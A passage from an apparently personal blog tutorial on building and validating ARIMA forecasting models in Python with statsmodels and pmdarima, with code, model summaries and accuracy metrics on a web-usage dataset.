class="line">df = pd.read_csv(<span class="string">&#x27;https://raw.githubusercontent.com/selva86/datasets/master/wwwusage.csv&#x27;</span>, names=[<span class="string">&#x27;value&#x27;</span>], header=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># Original Series</span></span><br><span class="line">fig, axes = plt.subplots(<span class="number">3</span>, <span class="number">2</span>, sharex=<span class="literal">True</span>)</span><br><span class="line">axes[<span class="number">0</span>, <span class="number">0</span>].plot(df.value); axes[<span class="number">0</span>, <span class="number">0</span>].set_title(<span class="string">&#x27;Original Series&#x27;</span>)</span><br><span class="line">plot_acf(df.value, ax=axes[<span class="number">0</span>, <span class="number">1</span>] ,lags=np.arange(<span class="built_in">len</span>(df) ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1st Differencing</span></span><br><span class="line">axes[<span class="number">1</span>, <span class="number">0</span>].plot(df.value.diff()); axes[<span class="number">1</span>, <span class="number">0</span>].set_title(<span class="string">&#x27;1st Order Differencing&#x27;</span>)</span><br><span class="line">plot_acf(df.value.diff().dropna(), ax=axes[<span class="number">1</span>, <span class="number">1</span>], lags=np.arange(<span class="built_in">len</span>(df) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2nd Differencing</span></span><br><span class="line">axes[<span class="number">2</span>, <span class="number">0</span>].plot(df.value.diff().diff()); axes[<span class="number">2</span>, <span class="number">0</span>].set_title(<span class="string">&#x27;2nd Order Differencing&#x27;</span>)</span><br><span class="line">plot_acf(df.value.diff().diff().dropna(), ax=axes[<span class="number">2</span>, <span class="number">1</span>],lags=np.arange(<span class="built_in">len</span>(df) - <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/2022/05/19/ARIMA/111.png" alt="111" style="zoom:150%;"><p>​                                                                    (*)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.stattools <span class="keyword">import</span> adfuller</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> log</span><br><span class="line">result = adfuller(df.value.dropna())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ADF Statistic: %f&#x27;</span> % result[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p-value: %f&#x27;</span> % result[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>we got</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ADF</span> Statistic: -<span class="number">2</span>.<span class="number">464240</span></span><br><span class="line"><span class="attribute">p</span>-value: <span class="number">0</span>.<span class="number">124419</span></span><br></pre></td></tr></table></figure><p>if P Value &gt; 0.05 we go ahead with finding the order of differencing.</p><p>Since P-value is greater than the significance level, we difference the series. please look at picture (*).</p><p>For the above series, the time series reaches stationarity with two orders of differencing. But on looking at the autocorrelation plot for the 2nd differencing the lag goes into the far negative zone fairly quick, which indicates, the series might have been over differenced.</p><p>So, I am going to tentatively fix the order of differencing as 1 even though the series is not perfectly stationary (weak stationarity).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> pmdarima.arima.utils <span class="keyword">import</span> ndiffs</span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;https://raw.githubusercontent.com/selva86/datasets/master/wwwusage.csv&#x27;</span>, names=[<span class="string">&#x27;value&#x27;</span>], header=<span class="number">0</span>)</span><br><span class="line">y = df.value</span><br><span class="line"></span><br><span class="line"><span class="comment">## Adf Test</span></span><br><span class="line"><span class="built_in">print</span>(ndiffs(y, test=<span class="string">&#x27;adf&#x27;</span>))  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># KPSS test</span></span><br><span class="line"><span class="built_in">print</span>(ndiffs(y, test=<span class="string">&#x27;kpss&#x27;</span>))  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PP test:</span></span><br><span class="line"><span class="built_in">print</span>(ndiffs(y, test=<span class="string">&#x27;pp&#x27;</span>))  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p><a href="https://alkaline-ml.com/pmdarima/modules/generated/pmdarima.arima.ndiffs.html">ndiffs的文档–Number of differences required for a stationary series</a></p><h3 id="How-to-find-the-order-of-the-AR-term-p"><a href="#How-to-find-the-order-of-the-AR-term-p" class="headerlink" title="How to find the order of the AR term (p)"></a>How to find the order of the AR term (p)</h3><h3 id="How-to-find-the-order-of-the-MA-term-q"><a href="#How-to-find-the-order-of-the-MA-term-q" class="headerlink" title="How to find the order of the MA term (q)"></a>How to find the order of the MA term (q)</h3><p>（1）ACF和PACF 利用拖尾和截尾来确定(这里还是有点没太完全清楚，，，感觉我的判断和网上说的有点区别。。。反正代码可以自动找。。。)</p><p>（2）信息准则定阶（AIC、BIC、HQIC）</p><h2 id="How-to-build-the-ARIMA-Model"><a href="#How-to-build-the-ARIMA-Model" class="headerlink" title="How to build the ARIMA Model"></a>How to build the ARIMA Model</h2><p><img src="/2022/05/19/ARIMA/image-20220520131454425.png" alt="image-20220520131454425"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np, pandas <span class="keyword">as</span> pd  </span><br><span class="line"><span class="keyword">from</span> statsmodels.tsa.arima_model <span class="keyword">import</span> ARIMA  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># importing data  </span></span><br><span class="line"><span class="comment">#https://raw.githubusercontent.com/selva86/datasets/master/austa.csv</span></span><br><span class="line"><span class="comment">#https://raw.githubusercontent.com/selva86/datasets/master/wwwusage.csv</span></span><br><span class="line">mydata = pd.read_csv(<span class="string">&#x27;https://raw.githubusercontent.com/selva86/datasets/master/wwwusage.csv&#x27;</span>, names = [<span class="string">&#x27;value&#x27;</span>], header = <span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Creating ARIMA model  </span></span><br><span class="line">mymodel = ARIMA(mydata.value, order = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>))  </span><br><span class="line">modelfit = mymodel.fit(disp = <span class="number">0</span>)  </span><br><span class="line"><span class="built_in">print</span>(modelfit.summary())  </span><br></pre></td></tr></table></figure><p>result:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">    ARIMA Model Results                              </span></span><br><span class="line"><span class="section">==============================================================================</span></span><br><span class="line">Dep. Variable:                D.value   No. Observations:                   99</span><br><span class="line">Model:                 ARIMA(1, 1, 2)   Log Likelihood                -253.790</span><br><span class="line">Method:                       css-mle   S.D. of innovations              3.119</span><br><span class="line">Date:                Fri, 20 May 2022   AIC                            517.579</span><br><span class="line">Time:                        11:59:24   BIC                            530.555</span><br><span class="line">Sample:                             1   HQIC                           522.829</span><br><span class="line"><span class="section">                                                                              </span></span><br><span class="line"><span class="section">=================================================================================</span></span><br><span class="line"><span class="code">                    coef    std err          z      P&gt;|z|      [0.025      0.975]</span></span><br><span class="line"><span class="code">---------------------------------------------------------------------------------</span></span><br><span class="line"><span class="code">const             1.1202      1.290      0.868      0.387      -1.409       3.649</span></span><br><span class="line"><span class="code">ar.L1.D.value     0.6351      0.257      2.469      0.015       0.131       1.139</span></span><br><span class="line"><span class="code">ma.L1.D.value     0.5287      0.355      1.489      0.140      -0.167       1.224</span></span><br><span class="line"><span class="code">ma.L2.D.value    -0.0010      0.321     -0.003      0.998      -0.631       0.629</span></span><br><span class="line"><span class="code">                                    Roots                                    </span></span><br><span class="line"><span class="code">=============================================================================</span></span><br><span class="line"><span class="code">                  Real          Imaginary           Modulus         Frequency</span></span><br><span class="line"><span class="code">-----------------------------------------------------------------------------</span></span><br><span class="line">AR.1            1.5746           +0.0000j            1.5746            0.0000</span><br><span class="line">MA.1           -1.8850           +0.0000j            1.8850            0.5000</span><br><span class="line"><span class="section">MA.2          545.0568           +0.0000j          545.0568            0.0000</span></span><br><span class="line"><span class="section">-----------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>The model summary reveals a lot of information. The table in the middle is the coefficients table where the values under ‘coef’ are the weights of the respective terms.</p><p>Notice here the coefficient of the MA2 term is close to zero and the P-Value in ‘P&gt;|z|’ column is highly insignificant. It should ideally be less than 0.05 for the respective X to be significant.</p><p>So, let’s rebuild the model without the MA2 term.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1,1,1 ARIMA Model</span></span><br><span class="line">model = ARIMA(df.value, order=(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">model_fit = model.fit(disp=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(model_fit.summary())</span><br></pre></td></tr></table></figure><p>result</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">    ARIMA Model Results                              </span></span><br><span class="line"><span class="section">==============================================================================</span></span><br><span class="line">Dep. Variable:                D.value   No. Observations:                   99</span><br><span class="line">Model:                 ARIMA(1, 1, 1)   Log Likelihood                -253.790</span><br><span class="line">Method:                       css-mle   S.D. of innovations              3.119</span><br><span class="line">Date:                Fri, 20 May 2022   AIC                            515.579</span><br><span class="line">Time:                        12:07:06   BIC                            525.960</span><br><span class="line">Sample:                             1   HQIC                           519.779</span><br><span class="line"><span class="section">                                                                              </span></span><br><span class="line"><span class="section">=================================================================================</span></span><br><span class="line"><span class="code">                    coef    std err          z      P&gt;|z|      [0.025      0.975]</span></span><br><span class="line"><span class="code">---------------------------------------------------------------------------------</span></span><br><span class="line"><span class="code">const             1.1205      1.286      0.871      0.386      -1.400       3.641</span></span><br><span class="line"><span class="code">ar.L1.D.value     0.6344      0.087      7.317      0.000       0.464       0.804</span></span><br><span class="line"><span class="code">ma.L1.D.value     0.5297      0.089      5.932      0.000       0.355       0.705</span></span><br><span class="line"><span class="code">                                    Roots                                    </span></span><br><span class="line"><span class="code">=============================================================================</span></span><br><span class="line"><span class="code">                  Real          Imaginary           Modulus         Frequency</span></span><br><span class="line"><span class="code">-----------------------------------------------------------------------------</span></span><br><span class="line">AR.1            1.5764           +0.0000j            1.5764            0.0000</span><br><span class="line"><span class="section">MA.1           -1.8879           +0.0000j            1.8879            0.5000</span></span><br><span class="line"><span class="section">-----------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>The model AIC has reduced, which is good. The P Values of the AR1 and MA1 terms have improved and are highly significant (&lt;&lt; 0.05).</p><p>Let’s plot the residuals to ensure there are no patterns (that is, look for constant mean and variance).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">residuals = pd.DataFrame(model_fit.resid)</span><br><span class="line">fig, ax = plt.subplots(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">residuals.plot(title=<span class="string">&quot;Residuals&quot;</span>, ax=ax[<span class="number">0</span>])</span><br><span class="line">residuals.plot(kind=<span class="string">&#x27;kde&#x27;</span>, title=<span class="string">&#x27;Density&#x27;</span>, ax=ax[<span class="number">1</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2022/05/19/ARIMA/222.png" alt="222"></p><p>The residual errors seem fine with near zero mean and uniform variance. Let’s plot the actuals against the fitted values using <code>plot_predict()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Actual vs Fitted</span></span><br><span class="line">model_fit.plot_predict(dynamic=<span class="literal">False</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2022/05/19/ARIMA/333.png" alt="333"></p><p>When you set <code>dynamic=False</code> the in-sample lagged values are used for prediction.</p><p>That is, the model gets trained up until the previous value to make the next prediction. This can make the fitted forecast and actuals look artificially good.</p><p>So, we seem to have a decent ARIMA model. But is that the best?</p><p>Can’t say that at this point because we haven’t actually forecasted into the future and compared the forecast with the actual performance.</p><p>So, the real validation you need now is the Out-of-Time cross-validation.</p><h2 id="How-to-do-find-the-optimal-ARIMA-model-manually-using-Out-of-Time-Cross-validation"><a href="#How-to-do-find-the-optimal-ARIMA-model-manually-using-Out-of-Time-Cross-validation" class="headerlink" title="How to do find the optimal ARIMA model manually using Out-of-Time Cross validation"></a>How to do find the optimal ARIMA model manually using Out-of-Time Cross validation</h2><p>In Out-of-Time cross-validation, you take few steps back in time and forecast into the future to as many steps you took back. Then you compare the forecast against the actuals.</p><p>To do out-of-time cross-validation, you need to create the training and testing dataset by splitting the time series into 2 contiguous parts in approximately 75:25 ratio or a reasonable proportion based on time frequency of series.</p><p>Why am I not sampling the training data randomly you ask?</p><p>That’s because the order sequence of the time series should be intact in order to use it for forecasting.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.stattools <span class="keyword">import</span> acf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create Training and Test</span></span><br><span class="line">train = df.value[:<span class="number">85</span>]</span><br><span class="line">test = df.value[<span class="number">85</span>:]</span><br></pre></td></tr></table></figure><p>we can now build the ARIMA model on training dataset, forecast and plot it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Build Model</span></span><br><span class="line"><span class="comment"># model = ARIMA(train, order=(3,2,1))  </span></span><br><span class="line">model = ARIMA(train, order=(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>))  </span><br><span class="line">fitted = model.fit(disp=-<span class="number">1</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Forecast</span></span><br><span class="line">fc, se, conf = fitted.forecast(<span class="number">15</span>, alpha=<span class="number">0.05</span>)  <span class="comment"># 95% conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make as pandas series</span></span><br><span class="line">fc_series = pd.Series(fc, index=test.index)</span><br><span class="line">lower_series = pd.Series(conf[:, <span class="number">0</span>], index=test.index)</span><br><span class="line">upper_series = pd.Series(conf[:, <span class="number">1</span>], index=test.index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>,<span class="number">5</span>), dpi=<span class="number">100</span>)</span><br><span class="line">plt.plot(train, label=<span class="string">&#x27;training&#x27;</span>)</span><br><span class="line">plt.plot(test, label=<span class="string">&#x27;actual&#x27;</span>)</span><br><span class="line">plt.plot(fc_series, label=<span class="string">&#x27;forecast&#x27;</span>)</span><br><span class="line">plt.fill_between(lower_series.index, lower_series, upper_series, </span><br><span class="line">                 color=<span class="string">&#x27;k&#x27;</span>, alpha=<span class="number">.15</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Forecast vs Actuals&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;upper left&#x27;</span>, fontsize=<span class="number">8</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2022/05/19/ARIMA/555.png" alt="555"></p><p>From the chart, the ARIMA(1,1,1) model seems to give a directionally correct forecast. And the actual observed values lie within the 95% confidence band. That seems fine.</p><p>But each of the predicted forecasts is consistently below the actuals. That means, by adding a small constant to our forecast, the accuracy will certainly improve. So, there is definitely scope for improvement.</p><p>So, what I am going to do is to increase the order of differencing to two, that is set <code>d=2</code> and iteratively increase p to up to 5 and then q up to 5 to see which model gives least AIC and also look for a chart that gives closer actuals and forecasts.</p><p>While doing this, I keep an eye on the P values of the AR and MA terms in the model summary. They should be as close to zero, ideally, less than 0.05.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Build Model</span></span><br><span class="line">model = ARIMA(train, order=(<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>))  </span><br><span class="line">fitted = model.fit(disp=-<span class="number">1</span>)  </span><br><span class="line"><span class="built_in">print</span>(fitted.summary())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Forecast</span></span><br><span class="line">fc, se, conf = fitted.forecast(<span class="number">15</span>, alpha=<span class="number">0.05</span>)  <span class="comment"># 95% conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make as pandas series</span></span><br><span class="line">fc_series = pd.Series(fc, index=test.index)</span><br><span class="line">lower_series = pd.Series(conf[:, <span class="number">0</span>], index=test.index)</span><br><span class="line">upper_series = pd.Series(conf[:, <span class="number">1</span>], index=test.index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>,<span class="number">5</span>), dpi=<span class="number">100</span>)</span><br><span class="line">plt.plot(train, label=<span class="string">&#x27;training&#x27;</span>)</span><br><span class="line">plt.plot(test, label=<span class="string">&#x27;actual&#x27;</span>)</span><br><span class="line">plt.plot(fc_series, label=<span class="string">&#x27;forecast&#x27;</span>)</span><br><span class="line">plt.fill_between(lower_series.index, lower_series, upper_series, </span><br><span class="line">                 color=<span class="string">&#x27;k&#x27;</span>, alpha=<span class="number">.15</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Forecast vs Actuals&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;upper left&#x27;</span>, fontsize=<span class="number">8</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">         ARIMA Model Results                              </span></span><br><span class="line"><span class="section">==============================================================================</span></span><br><span class="line">Dep. Variable:               D2.value   No. Observations:                   83</span><br><span class="line">Model:                 ARIMA(3, 2, 1)   Log Likelihood                -214.248</span><br><span class="line">Method:                       css-mle   S.D. of innovations              3.153</span><br><span class="line">Date:                Fri, 20 May 2022   AIC                            440.497</span><br><span class="line">Time:                        12:22:22   BIC                            455.010</span><br><span class="line">Sample:                             2   HQIC                           446.327</span><br><span class="line"><span class="section">                                                                              </span></span><br><span class="line"><span class="section">==================================================================================</span></span><br><span class="line"><span class="code">                     coef    std err          z      P&gt;|z|      [0.025      0.975]</span></span><br><span class="line"><span class="code">----------------------------------------------------------------------------------</span></span><br><span class="line"><span class="code">const              0.0483      0.084      0.577      0.565      -0.116       0.212</span></span><br><span class="line"><span class="code">ar.L1.D2.value     1.1386      0.109     10.399      0.000       0.924       1.353</span></span><br><span class="line"><span class="code">ar.L2.D2.value    -0.5923      0.155     -3.827      0.000      -0.896      -0.289</span></span><br><span class="line"><span class="code">ar.L3.D2.value     0.3079      0.111      2.778      0.007       0.091       0.525</span></span><br><span class="line"><span class="code">ma.L1.D2.value    -1.0000      0.035    -28.799      0.000      -1.068      -0.932</span></span><br><span class="line"><span class="code">                                    Roots                                    </span></span><br><span class="line"><span class="code">=============================================================================</span></span><br><span class="line"><span class="code">                  Real          Imaginary           Modulus         Frequency</span></span><br><span class="line"><span class="code">-----------------------------------------------------------------------------</span></span><br><span class="line">AR.1            1.1557           -0.0000j            1.1557           -0.0000</span><br><span class="line">AR.2            0.3839           -1.6318j            1.6763           -0.2132</span><br><span class="line">AR.3            0.3839           +1.6318j            1.6763            0.2132</span><br><span class="line"><span class="section">MA.1            1.0000           +0.0000j            1.0000            0.0000</span></span><br><span class="line"><span class="section">-----------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>The AIC has reduced to 440 from 515. Good. The P-values of the X terms are less the &lt; 0.05, which is great.</p><p>So overall it’s much better.</p><p>Ideally, you should go back multiple points in time, like, go back 1, 2, 3 and 4 quarters and see how your forecasts are performing at various points in the year.</p><p>Here’s a great practice exercise: Try to go back 27, 30, 33, 36 data points and see how the forcasts performs. The forecast performance can be judged using various accuracy metrics discussed next.</p><h2 id="Accuracy-Metrics-for-Time-Series-Forecast"><a href="#Accuracy-Metrics-for-Time-Series-Forecast" class="headerlink" title="Accuracy Metrics for Time Series Forecast"></a>Accuracy Metrics for Time Series Forecast</h2><p>The commonly used accuracy metrics to judge forecasts are:</p><ol><li>Mean Absolute Percentage Error (MAPE)</li><li>Mean Error (ME)</li><li>Mean Absolute Error (MAE)</li><li>Mean Percentage Error (MPE)</li><li>Root Mean Squared Error (RMSE)</li><li>Lag 1 Autocorrelation of Error (ACF1)</li><li>Correlation between the Actual and the Forecast (corr)</li><li>Min-Max Error (minmax)</li></ol><p>Typically, if you are comparing forecasts of two different series, the MAPE, Correlation and Min-Max Error can be used.</p><p>Why not use the other metrics?</p><p>Because only the above three are percentage errors that vary between 0 and 1. That way, you can judge how good is the forecast irrespective of the scale of the series.</p><p>The other error metrics are quantities. That implies, an RMSE of 100 for a series whose mean is in 1000’s is better than an RMSE of 5 for series in 10’s. So, you can’t really use them to compare the forecasts of two different scaled time series.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Accuracy metrics</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forecast_accuracy</span>(<span class="params">forecast, actual</span>):</span><br><span class="line">    mape = np.mean(np.<span class="built_in">abs</span>(forecast - actual)/np.<span class="built_in">abs</span>(actual))  <span class="comment"># MAPE</span></span><br><span class="line">    me = np.mean(forecast - actual)             <span class="comment"># ME</span></span><br><span class="line">    mae = np.mean(np.<span class="built_in">abs</span>(forecast - actual))    <span class="comment"># MAE</span></span><br><span class="line">    mpe = np.mean((forecast - actual)/actual)   <span class="comment"># MPE</span></span><br><span class="line">    rmse = np.mean((forecast - actual)**<span class="number">2</span>)**<span class="number">.5</span>  <span class="comment"># RMSE</span></span><br><span class="line">    corr = np.corrcoef(forecast, actual)[<span class="number">0</span>,<span class="number">1</span>]   <span class="comment"># corr</span></span><br><span class="line">    mins = np.amin(np.hstack([forecast[:,<span class="literal">None</span>], </span><br><span class="line">                              actual[:,<span class="literal">None</span>]]), axis=<span class="number">1</span>)</span><br><span class="line">    maxs = np.amax(np.hstack([forecast[:,<span class="literal">None</span>], </span><br><span class="line">                              actual[:,<span class="literal">None</span>]]), axis=<span class="number">1</span>)</span><br><span class="line">    minmax = <span class="number">1</span> - np.mean(mins/maxs)             <span class="comment"># minmax</span></span><br><span class="line">    acf1 = acf(fc-test)[<span class="number">1</span>]                      <span class="comment"># ACF1</span></span><br><span class="line">    <span class="keyword">return</span>(&#123;<span class="string">&#x27;mape&#x27;</span>:mape, <span class="string">&#x27;me&#x27;</span>:me, <span class="string">&#x27;mae&#x27;</span>: mae, </span><br><span class="line">            <span class="string">&#x27;mpe&#x27;</span>: mpe, <span class="string">&#x27;rmse&#x27;</span>:rmse, <span class="string">&#x27;acf1&#x27;</span>:acf1, </span><br><span class="line">            <span class="string">&#x27;corr&#x27;</span>:corr, <span class="string">&#x27;minmax&#x27;</span>:minmax&#125;)</span><br><span class="line"></span><br><span class="line">forecast_accuracy(fc, test.values)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&gt; &#123;&#x27;mape&#x27;: 0.02250131357314834,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;me&#x27;: 3.230783108990054,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;mae&#x27;: 4.548322194530069,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;mpe&#x27;: 0.016421001932706705,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;rmse&#x27;: 6.373238534601827,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;acf1&#x27;: 0.5105506325288692,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;corr&#x27;: 0.9674576513924394,</span></span><br><span class="line"><span class="comment">#&gt;  &#x27;minmax&#x27;: 0.02163154777672227&#125;</span></span><br></pre></td></tr></table></figure><p>Around 2.2% MAPE implies the model is about 97.8% accurate in predicting the next 15 observations.</p><p>Now you know how to build an ARIMA model manually.</p><p>But in industrial situations, you will be given a lot of time series to be forecasted and the forecasting exercise be repeated regularly.</p><p>So we need a way to automate the best model selection process.</p><h2 id="How-to-do-Auto-Arima-Forecast-in-Python"><a href="#How-to-do-Auto-Arima-Forecast-in-Python" class="headerlink" title="How to do Auto Arima Forecast in Python"></a>How to do Auto Arima Forecast in Python</h2><p>Like R’s popular <code>auto.arima()</code> function, the <code>pmdarima</code> package provides <code>auto_arima()</code> with similar functionality.</p><p><code>auto_arima()</code> uses a stepwise approach to search multiple combinations of p,d,q parameters and chooses the best model that has the least AIC.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.arima_model <span class="keyword">import</span> ARIMA</span><br><span class="line"><span class="keyword">import</span> pmdarima <span class="keyword">as</span> pm</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;https://raw.githubusercontent.com/selva86/datasets/master/wwwusage.csv&#x27;</span>, names=[<span class="string">&#x27;value&#x27;</span>], header=<span 